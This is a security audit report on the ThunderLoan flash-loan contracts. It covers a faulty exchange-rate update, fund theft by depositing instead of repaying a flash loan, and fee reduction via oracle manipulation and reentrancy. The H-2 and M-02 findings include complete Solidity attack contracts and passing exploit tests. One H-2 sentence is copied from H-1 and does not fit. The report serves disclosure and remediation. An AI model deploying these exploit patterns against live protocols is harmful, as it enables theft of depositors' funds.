### [H-1] Incorrect and unnecessary rewards calculation in `ThunderLoan::deposit` function using `AssetToken::updateExchangeRate`, which cases protocol to think it received more fee than it should and blocks redemptions.

**Description:** `exchangeRate` is responsible for calculating the exchange between assetTokens and underlying token assets. It decides in a way the amount of fee to give to liquidity providers.

However in `deposit` function, updates are made to this rate without collecting any fee.

```javascript
function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);

        //@audit-high the fee should not be updated while depositing, as it manipulates the rewards in incorrect ways.
@>      uint256 calculatedFee = getCalculatedFee(token, amount);
@>      assetToken.updateExchangeRate(calculatedFee);

        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```

**Impact:** When liquidity provider deposits their assets, it updates the rate based on their deposit. Which leads to several impacts:

1. The `redeem` function is blocked, as protocols assumes more tokens are owed to liquidity providers than it actually has.
2. The rewards are calculated incorrectly, which leads to users getting more/less tokens than intended.

**Proof of Concept:**

1. LP deposits
2. User takes out a loan.
3. It is not possible for LP providers to redeem.

<details>
<summary>Proof of code</summary>

Place the following test in `ThunderLoanTest.t.sol`.

```javascript
function testRedeemAfterLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 amountToRedeem = type(uint256).max;
        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, amountToRedeem);
        vm.stopPrank();
    }
```

</details>

**Recommended Mitigation:** Remove the exchange rate updation in `deposit` function

```diff
function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);

        //@audit-high the fee should not be updated while depositing, as it manipulates the rewards in incorrect ways.
-       uint256 calculatedFee = getCalculatedFee(token, amount);
-       assetToken.updateExchangeRate(calculatedFee);

        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```

### [H-2] Funds can be stolen by the attacker if they ignore the repay function and instead deposit the same amount.

**Description:** After someone flash loans the amount of tokens they want to, instead of having to `ThunderLoan::repay` function, they can directly deposit the same amount of tokens directly using `deposit` function. Which would lead to protocol thinking the `endingBalance` is equal to starting balance, but what really happens is the attacker deposits the tokens under their own deposited balance and steal funds from the person/people who originally deposit funds.

However in `deposit` function, updates are made to this rate without collecting any fee.

## POC

To execute the test successfully, please complete the following steps:

1. Place the **`attack.sol`** file within the mocks folder.
1. Import the contract in **`ThunderLoanTest.t.sol`**.
1. Add **`testattack()`** function in **`ThunderLoanTest.t.sol`**.
1. Change the **`setUp()`** function in **`ThunderLoanTest.t.sol`**.

```Solidity
import { Attack } from "../mocks/attack.sol";
```

```Solidity
function testattack() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        vm.startPrank(user);
        tokenA.mint(address(attack), AMOUNT);
        thunderLoan.flashloan(address(attack), tokenA, amountToBorrow, "");
        attack.sendAssetToken(address(thunderLoan.getAssetFromToken(tokenA)));
        thunderLoan.redeem(tokenA, type(uint256).max);
        vm.stopPrank();

        assertLt(tokenA.balanceOf(address(thunderLoan.getAssetFromToken(tokenA))), DEPOSIT_AMOUNT);
    }
```

```Solidity
function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
        vm.prank(user);
        attack = new Attack(address(thunderLoan));
    }
```

attack.sol

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { SafeERC20 } from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";

interface IThunderLoan {
    function repay(address token, uint256 amount) external;
    function deposit(IERC20 token, uint256 amount) external;
    function getAssetFromToken(IERC20 token) external;
}


contract Attack {
    error MockFlashLoanReceiver__onlyOwner();
    error MockFlashLoanReceiver__onlyThunderLoan();

    using SafeERC20 for IERC20;

    address s_owner;
    address s_thunderLoan;

    uint256 s_balanceDuringFlashLoan;
    uint256 s_balanceAfterFlashLoan;

    constructor(address thunderLoan) {
        s_owner = msg.sender;
        s_thunderLoan = thunderLoan;
        s_balanceDuringFlashLoan = 0;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata /*  params */
    )
        external
        returns (bool)
    {
        s_balanceDuringFlashLoan = IERC20(token).balanceOf(address(this));

        if (initiator != s_owner) {
            revert MockFlashLoanReceiver__onlyOwner();
        }

        if (msg.sender != s_thunderLoan) {
            revert MockFlashLoanReceiver__onlyThunderLoan();
        }
        IERC20(token).approve(s_thunderLoan, amount + fee);
        IThunderLoan(s_thunderLoan).deposit(IERC20(token), amount + fee);
        s_balanceAfterFlashLoan = IERC20(token).balanceOf(address(this));
        return true;
    }

    function getbalanceDuring() external view returns (uint256) {
        return s_balanceDuringFlashLoan;
    }

    function getBalanceAfter() external view returns (uint256) {
        return s_balanceAfterFlashLoan;
    }

    function sendAssetToken(address assetToken) public {

        IERC20(assetToken).transfer(msg.sender, IERC20(assetToken).balanceOf(address(this)));
    }
}
```

Notice that the **`assetLt()`** checks whether the balance of the AssetToken contract is less than the **`DEPOSIT_AMOUNT`**, which represents the initial balance. The contract balance should never decrease after a flash loan, it should always be higher.

## Impact

All the funds of the AssetContract can be stolen.

## Tools Used

Manual review.

## Recommendations

Add a check in **`deposit()`** to make it impossible to use it in the same block of the flash loan.
For example registring the block.number in a variable in **`flashloan()`** and checking it in **`deposit()`**.

### <a id='M-02'></a>[M-02] Attacker can minimize `ThunderLoan::flashloan` fee via price oracle manipulation

**Description:**

In `ThunderLoan::flashloan` the price of the `fee` is calculated on [line 192](https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/8539c83865eb0d6149e4d70f37a35d9e72ac7404/src/protocol/ThunderLoan.sol#L192) using the method `ThunderLoan::getCalculatedFee`:

```solidity
uint256 fee = getCalculatedFee(token, amount);
```

```solidity
function getCalculatedFee(IERC20 token, uint256 amount) public view returns (uint256 fee) {
    //slither-disable-next-line divide-before-multiply
    uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / s_feePrecision;
    //slither-disable-next-line divide-before-multiply
    fee = (valueOfBorrowedToken * s_flashLoanFee) / s_feePrecision;
}
```

`getCalculatedFee()` uses the function `OracleUpgradeable::getPriceInWeth` to calculate the price of a single underlying token in WETH:

```solidity
function getPriceInWeth(address token) public view returns (uint256) {
    address swapPoolOfToken = IPoolFactory(s_poolFactory).getPool(token);
    return ITSwapPool(swapPoolOfToken).getPriceOfOnePoolTokenInWeth();
}
```

This function gets the address of the token-WETH pool, and calls `TSwapPool::getPriceOfOnePoolTokenInWeth` on the pool. This function's behavior is dependent on the implementation of the `ThunderLoan::initialize` argument `tswapAddress` but it can be assumed to be a constant product liquidity pool similar to Uniswap. This means that the use of this price based on the pool reserves can be subject to price oracle manipulation.

If an attacker provides a large amount of liquidity of either WETH or the token, they can decrease/increase the price of the token with respect to WETH. If the attacker decreases the price of the token in WETH by sending a large amount of the token to the liquidity pool, at a certain threshold, the numerator of the following function will be minimally greater (not less than or the function will revert, see below) than `s_feePrecision`, resulting in a minimal value for `valueOfBorrowedToken`:

```solidity
uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / s_feePrecision;
```

Since a value of `0` for the `fee` would revert as `assetToken.updateExchangeRate(fee);` would revert since there is a check ensuring that the exchange rate increases, which with a `0` fee, the exchange rate would stay the same, hence the function will revert:

```solidity
function updateExchangeRate(uint256 fee) external onlyThunderLoan {
    // 1. Get the current exchange rate
    // 2. How big the fee is should be divided by the total supply
    // 3. So if the fee is 1e18, and the total supply is 2e18, the exchange rate be multiplied by 1.5
    // if the fee is 0.5 ETH, and the total supply is 4, the exchange rate should be multiplied by 1.125
    // it should always go up, never down
    // newExchangeRate = oldExchangeRate * (totalSupply + fee) / totalSupply
    // newExchangeRate = 1 (4 + 0.5) / 4
    // newExchangeRate = 1.125
    uint256 newExchangeRate = s_exchangeRate * (totalSupply() + fee) / totalSupply();

    // newExchangeRate = s_exchangeRate + fee/totalSupply();

    if (newExchangeRate <= s_exchangeRate) {
        revert AssetToken__ExhangeRateCanOnlyIncrease(s_exchangeRate, newExchangeRate);
    }
    s_exchangeRate = newExchangeRate;
    emit ExchangeRateUpdated(s_exchangeRate);
}
```

`flashloan()` can be reentered on [line 201-210](https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/8539c83865eb0d6149e4d70f37a35d9e72ac7404/src/protocol/ThunderLoan.sol#L201-L210):

```solidity
receiverAddress.functionCall(
    abi.encodeWithSignature(
        "executeOperation(address,uint256,uint256,address,bytes)",
        address(token),
        amount,
        fee,
        msg.sender,
        params
    )
);
```

This means that an attacking contract can perform an attack by:

1. Calling `flashloan()` with a sufficiently small value for `amount`
2. Reenter the contract and perform the price oracle manipulation by sending liquidity to the pool during the `executionOperation` callback
3. Re-calling `flashloan()` this time with a large value for `amount` but now the `fee` will be minimal, regardless of the size of the loan.
4. Returning the second and the first loans and withdrawing their liquidity from the pool ensuring that they only paid two, small `fees for an arbitrarily large loan.

## Impact

An attacker can reenter the contract and take a reduced-fee flash loan. Since the attacker is required to either:

1. Take out a flash loan to pay for the price manipulation: This is not financially beneficial unless the amount of tokens required to manipulate the price is less than the reduced fee loan. Enough that the initial fee they pay is less than the reduced fee paid by an amount equal to the reduced fee price.
2. Already owning enough funds to be able to manipulate the price: This is financially beneficial since the initial loan only needs to be minimally small.

The first option isn't financially beneficial in most circumstances and the second option is likely, especially for lower liquidity pools which are easier to manipulate due to lower capital requirements. Therefore, the impact is high since the liquidity providers should be earning fees proportional to the amount of tokens loaned. Hence, this is a high-severity finding.

## Proof of concept

### Working test case

The attacking contract implements an `executeOperation` function which, when called via the `ThunderLoan` contract, will perform the following sequence of function calls:

- Calls the mock pool contract to set the price (simulating manipulating the price)
- Repay the initial loan
- Re-calls `flashloan`, taking a large loan now with a reduced fee
- Repay second loan

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { SafeERC20 } from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import { IFlashLoanReceiver, IThunderLoan } from "../../src/interfaces/IFlashLoanReceiver.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { MockTSwapPool } from "./MockTSwapPool.sol";
import { ThunderLoan } from "../../src/protocol/ThunderLoan.sol";

contract AttackFlashLoanReceiver {
    error AttackFlashLoanReceiver__onlyOwner();
    error AttackFlashLoanReceiver__onlyThunderLoan();

    using SafeERC20 for IERC20;

    address s_owner;
    address s_thunderLoan;

    uint256 s_balanceDuringFlashLoan;
    uint256 s_balanceAfterFlashLoan;

    uint256 public attackAmount = 1e20;
    uint256 public attackFee1;
    uint256 public attackFee2;
    address tSwapPool;
    IERC20 tokenA;

    constructor(address thunderLoan, address _tSwapPool, IERC20 _tokenA) {
        s_owner = msg.sender;
        s_thunderLoan = thunderLoan;
        s_balanceDuringFlashLoan = 0;
        tSwapPool = _tSwapPool;
        tokenA = _tokenA;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata params
    )
        external
        returns (bool)
    {
        s_balanceDuringFlashLoan = IERC20(token).balanceOf(address(this));

        // check if it is the first time through the reentrancy
        bool isFirst = abi.decode(params, (bool));

        if (isFirst) {
            // Manipulate the price
            MockTSwapPool(tSwapPool).setPrice(1e15);
            // repay the initial, small loan
            IERC20(token).approve(s_thunderLoan, attackFee1 + 1e6);
            IThunderLoan(s_thunderLoan).repay(address(tokenA), 1e6 + attackFee1);
            ThunderLoan(s_thunderLoan).flashloan(address(this), tokenA, attackAmount, abi.encode(false));
            attackFee1 = fee;
            return true;
        } else {
            attackFee2 = fee;
            // simulate withdrawing the funds from the price pool
           //MockTSwapPool(tSwapPool).setPrice(1e18);
            // repay the second, large low fee loan
            IERC20(token).approve(s_thunderLoan, attackAmount + attackFee2);
            IThunderLoan(s_thunderLoan).repay(address(tokenA), attackAmount + attackFee2);
            return true;
        }
    }

    function getbalanceDuring() external view returns (uint256) {
        return s_balanceDuringFlashLoan;
    }

    function getBalanceAfter() external view returns (uint256) {
        return s_balanceAfterFlashLoan;
    }
}

```

The following test first calls `flashloan()` with the attacking contract, the `executeOperation()` callback then executes the attack.

```solidity
function test_poc_smallFeeReentrancy() public setAllowedToken hasDeposits {
    uint256 price = MockTSwapPool(tokenToPool[address(tokenA)]).price();
    console.log("price before: ", price);
    // borrow a large amount to perform the price oracle manipulation
    uint256 amountToBorrow = 1e6;
    bool isFirstCall = true;
    bytes memory params = abi.encode(isFirstCall);

    uint256 expectedSecondFee = thunderLoan.getCalculatedFee(tokenA, attackFlashLoanReceiver.attackAmount());

    // Give the attacking contract reserve tokens for the price oracle manipulation & paying fees
    // For a less funded attacker, they could use the initial flash loan to perform the manipulation but pay a higher initial fee
    tokenA.mint(address(attackFlashLoanReceiver), AMOUNT);

    vm.startPrank(user);
    thunderLoan.flashloan(address(attackFlashLoanReceiver), tokenA, amountToBorrow, params);
    vm.stopPrank();
    assertGt(expectedSecondFee, attackFlashLoanReceiver.attackFee2());
    uint256 priceAfter = MockTSwapPool(tokenToPool[address(tokenA)]).price();
    console.log("price after: ", priceAfter);

    console.log("expectedSecondFee: ", expectedSecondFee);
    console.log("attackFee2: ", attackFlashLoanReceiver.attackFee2());
    console.log("attackFee1: ", attackFlashLoanReceiver.attackFee1());
}
```

```bash
$ forge test --mt test_poc_smallFeeReentrancy -vvvv

// output
Running 1 test for test/unit/ThunderLoanTest.t.sol:ThunderLoanTest
[PASS] test_poc_smallFeeReentrancy() (gas: 1162442)
Logs:
  price before:  1000000000000000000
  price after:  1000000000000000
  expectedSecondFee:  300000000000000000
  attackFee2:  300000000000000
  attackFee1:  3000
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.52ms
```

Since the test passed, the fee has been successfully reduced due to price oracle manipulation.

## Recommended mitigation

Use a manipulation-resistant oracle such as Chainlink.

## Tools used

- Forge
